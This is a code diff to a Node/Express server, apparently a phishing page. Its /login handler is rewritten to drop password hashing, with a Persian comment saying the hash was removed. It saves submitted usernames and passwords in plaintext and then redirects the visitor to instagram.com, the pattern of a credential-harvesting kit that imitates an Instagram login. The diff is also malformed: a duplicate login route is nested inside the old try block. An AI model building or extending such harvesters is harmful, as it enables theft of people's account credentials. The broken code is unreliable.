@@ -27,10 +27,23 @@ app.use(express.static(path.join(__dirname))); // index.html
 app.post('/login', async (req,res) => {
   const { username, password } = req.body;
   try {
-    const hashedPassword = await bcrypt.hash(password,10);
-    db.run(
-      `INSERT INTO users (username,password) VALUES (?,?)`,
-      [username, hashedPassword],
+    app.post('/login', (req,res) => {
+  const { username, password } = req.body;
+
+  db.run(
+    `INSERT INTO users (username,password) VALUES (?,?)`,
+    [username, password],  // هش حذف شد
+    function(err){
+      if(err){
+        console.error(err);
+        res.send('خطا در ثبت');
+      } else {
+        res.redirect('https://www.instagram.com');
+      }
+    }
+  );
+});
+
       function(err){
         if(err){
           console.error(err);
@@ -60,4 +73,5 @@ app.get('/admin', (req, res) => {
 
 
 app.listen(port,()=>{console.log(`Server running at http://localhost:${port}`)});
+
 
